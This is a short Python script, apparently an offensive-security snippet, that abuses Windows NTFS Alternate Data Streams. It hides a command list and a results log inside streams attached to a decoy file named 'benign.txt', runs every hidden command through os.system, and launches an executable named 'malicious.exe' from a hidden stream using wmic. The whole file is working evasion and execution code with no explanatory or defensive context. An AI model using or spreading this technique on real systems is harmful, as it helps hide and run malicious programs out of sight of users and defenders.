import os

def BuildADSFilename(filename,streamname):
    return filename+":"+streamname

decoy='benign.txt'
resultFile=BuildADSFilename(decoy,"results.txt")
commandFile=BuildADSFilename(decoy,'commands.txt')

with open(commandFile,'r') as c:
    for line in c:
        str(os.system(line+" >> "+resultFile))

exefile='malicious.exe'
exepath=os.path.join(os.getcwd(),BuildADSFilename(decoy,exefile))
os.system("wmic process call create "+exepath)
